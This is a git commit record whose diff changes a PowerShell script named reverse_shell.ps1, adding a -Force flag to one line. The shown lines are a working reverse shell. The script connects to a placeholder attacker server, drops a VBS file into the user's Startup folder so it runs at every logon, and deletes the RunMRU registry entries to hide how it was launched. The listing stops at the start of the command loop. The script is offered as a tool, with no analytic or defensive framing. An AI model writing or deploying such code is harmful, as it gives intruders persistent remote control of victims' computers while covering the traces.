3074b63f59f5c3ae6b86f55081ad9fab8f1fa54c
Damien <100437527+damien-grau@users.noreply.github.com>
2023-08-24 11:13:14 +0200

    Update reverse_shell.ps1
    Added the -Force parameter to forcefully move the file, even if it needs to be replaced.

--- reverse_shell.ps1
+++ reverse_shell.ps1
@@ -1,7 +1,7 @@
 Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("<SERVER_IP>",<SERVER_PORT>));
 Set-Variable -Name stream -Value ($client.GetStream());
 [byte[]]$bytes = 0..65535|%{0};
-Move-Item C:\Users\Public\s.vbs "C:\Users\${env:USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
+Move-Item C:\Users\Public\s.vbs "C:\Users\${env:USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" -Force;
 Remove-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Name "*";
 
 while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){
